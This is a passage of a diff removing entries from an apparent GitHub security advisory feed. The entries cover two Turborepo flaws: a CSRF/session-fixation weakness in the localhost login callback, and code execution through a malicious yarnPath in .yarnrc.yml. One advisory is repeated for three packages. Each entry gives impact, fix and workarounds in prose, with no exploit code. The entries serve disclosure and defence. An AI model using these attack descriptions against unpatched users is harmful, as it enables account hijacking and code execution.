-<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-9r33-xhw8-4qqp">https://github.com/haxtheweb/issues/security/advisories/GHSA-9r33-xhw8-4qqp</a></li>
-<li><a href="https://github.com/advisories/GHSA-9r33-xhw8-4qqp">https://github.com/advisories/GHSA-9r33-xhw8-4qqp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9r33-xhw8-4qqp</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-19T19:51:51.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[turbo] Trubo: Login callback CSRF/session fixation]]></title>
-        <id>https://github.com/advisories/GHSA-hcf7-66rw-9f5r</id>
-        <link href="https://github.com/advisories/GHSA-hcf7-66rw-9f5r"/>
-        <updated>2026-05-19T19:49:55.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Turborepo's self-hosted login and SSO browser flows did not validate a CSRF state value on the localhost callback. While the CLI was waiting for authentication, a malicious web page could send a request to the local callback server with an attacker-controlled token. If accepted before the legitimate callback, the CLI could complete login with the wrong credentials.</p>
-<p>This affects users authenticating the <code>turbo</code> CLI against self-hosted remote cache/auth endpoints. Vercel-hosted login flows using device authorization are not affected.</p>
-<h3 id="fix">Fix</h3>
-<p>The login and SSO redirect flows now generate a random state value, include it in the browser authentication URL, and require the same value on the localhost callback before accepting a token. Callbacks with a missing or mismatched state are rejected.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately, avoid browser-based self-hosted <code>turbo login</code> or SSO flows on machines that may load untrusted web content during authentication. Use a pre-provisioned token or environment-based authentication instead.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vercel/turborepo/security/advisories/GHSA-hcf7-66rw-9f5r">https://github.com/vercel/turborepo/security/advisories/GHSA-hcf7-66rw-9f5r</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45773">https://nvd.nist.gov/vuln/detail/CVE-2026-45773</a></li>
-<li><a href="https://github.com/advisories/GHSA-hcf7-66rw-9f5r">https://github.com/advisories/GHSA-hcf7-66rw-9f5r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hcf7-66rw-9f5r</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-19T19:49:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@turbo/workspaces] Turbo: Unexpected local code execution during Yarn Berry detection]]></title>
-        <id>https://github.com/advisories/GHSA-3qcw-2rhx-2726</id>
-        <link href="https://github.com/advisories/GHSA-3qcw-2rhx-2726"/>
-        <updated>2026-05-19T19:46:44.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Turborepo can be vulnerable to arbitrary code execution when run in untrusted repositories that contain malicious Yarn configuration. In affected versions, package manager detection executed <code>yarn --version</code> from the project directory, which could cause Yarn to load and execute a project-controlled <code>yarnPath</code> from <code>.yarnrc.yml</code>. An attacker who controls repository contents could cause code execution when a user or CI system runs affected <code>turbo</code>, <code>@turbo/codemod</code>, or <code>@turbo/workspace</code> conversion commands.</p>
-<h3 id="fix">Fix</h3>
-<p>Turbo now avoids executing project-local Yarn during package manager detection. Yarn versions and paths are inferred from metadata such as <code>package.json</code>, parsing the value of <code>yarnPath</code> in <code>.yarnrc.yml</code> rather than executing it, and <code>yarn.lock</code>, and unrecognized Yarn lockfile formats are rejected instead of falling back to executing <code>yarn</code>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately, do not run Turborepo commands in untrusted repositories. Review or remove <code>.yarnrc.yml</code> files that define <code>yarnPath</code> before running Turborepo, especially in CI or automated tooling that processes external projects.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vercel/turborepo/security/advisories/GHSA-3qcw-2rhx-2726">https://github.com/vercel/turborepo/security/advisories/GHSA-3qcw-2rhx-2726</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45772">https://nvd.nist.gov/vuln/detail/CVE-2026-45772</a></li>
-<li><a href="https://github.com/advisories/GHSA-3qcw-2rhx-2726">https://github.com/advisories/GHSA-3qcw-2rhx-2726</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3qcw-2rhx-2726</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-19T19:46:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@turbo/codemod] Turbo: Unexpected local code execution during Yarn Berry detection]]></title>
-        <id>https://github.com/advisories/GHSA-3qcw-2rhx-2726</id>
-        <link href="https://github.com/advisories/GHSA-3qcw-2rhx-2726"/>
-        <updated>2026-05-19T19:46:44.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Turborepo can be vulnerable to arbitrary code execution when run in untrusted repositories that contain malicious Yarn configuration. In affected versions, package manager detection executed <code>yarn --version</code> from the project directory, which could cause Yarn to load and execute a project-controlled <code>yarnPath</code> from <code>.yarnrc.yml</code>. An attacker who controls repository contents could cause code execution when a user or CI system runs affected <code>turbo</code>, <code>@turbo/codemod</code>, or <code>@turbo/workspace</code> conversion commands.</p>
-<h3 id="fix">Fix</h3>
-<p>Turbo now avoids executing project-local Yarn during package manager detection. Yarn versions and paths are inferred from metadata such as <code>package.json</code>, parsing the value of <code>yarnPath</code> in <code>.yarnrc.yml</code> rather than executing it, and <code>yarn.lock</code>, and unrecognized Yarn lockfile formats are rejected instead of falling back to executing <code>yarn</code>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately, do not run Turborepo commands in untrusted repositories. Review or remove <code>.yarnrc.yml</code> files that define <code>yarnPath</code> before running Turborepo, especially in CI or automated tooling that processes external projects.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vercel/turborepo/security/advisories/GHSA-3qcw-2rhx-2726">https://github.com/vercel/turborepo/security/advisories/GHSA-3qcw-2rhx-2726</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45772">https://nvd.nist.gov/vuln/detail/CVE-2026-45772</a></li>
-<li><a href="https://github.com/advisories/GHSA-3qcw-2rhx-2726">https://github.com/advisories/GHSA-3qcw-2rhx-2726</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3qcw-2rhx-2726</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-19T19:46:44.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[turbo] Turbo: Unexpected local code execution during Yarn Berry detection]]></title>
-        <id>https://github.com/advisories/GHSA-3qcw-2rhx-2726</id>
-        <link href="https://github.com/advisories/GHSA-3qcw-2rhx-2726"/>
-        <updated>2026-05-19T19:46:44.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Turborepo can be vulnerable to arbitrary code execution when run in untrusted repositories that contain malicious Yarn configuration. In affected versions, package manager detection executed <code>yarn --version</code> from the project directory, which could cause Yarn to load and execute a project-controlled <code>yarnPath</code> from <code>.yarnrc.yml</code>. An attacker who controls repository contents could cause code execution when a user or CI system runs affected <code>turbo</code>, <code>@turbo/codemod</code>, or <code>@turbo/workspace</code> conversion commands.</p>
-<h3 id="fix">Fix</h3>
-<p>Turbo now avoids executing project-local Yarn during package manager detection. Yarn versions and paths are inferred from metadata such as <code>package.json</code>, parsing the value of <code>yarnPath</code> in <code>.yarnrc.yml</code> rather than executing it, and <code>yarn.lock</code>, and unrecognized Yarn lockfile formats are rejected instead of falling back to executing <code>yarn</code>.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If you cannot upgrade immediately, do not run Turborepo commands in untrusted repositories. Review or remove <code>.yarnrc.yml</code> files that define <code>yarnPath</code> before running Turborepo, especially in CI or automated tooling that processes external projects.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vercel/turborepo/security/advisories/GHSA-3qcw-2rhx-2726">https://github.com/vercel/turborepo/security/advisories/GHSA-3qcw-2rhx-2726</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45772">https://nvd.nist.gov/vuln/detail/CVE-2026-45772</a></li>
-<li><a href="https://github.com/advisories/GHSA-3qcw-2rhx-2726">https://github.com/advisories/GHSA-3qcw-2rhx-2726</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3qcw-2rhx-2726</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-19T19:46:44.000Z</published>
     </entry>
 </feed>
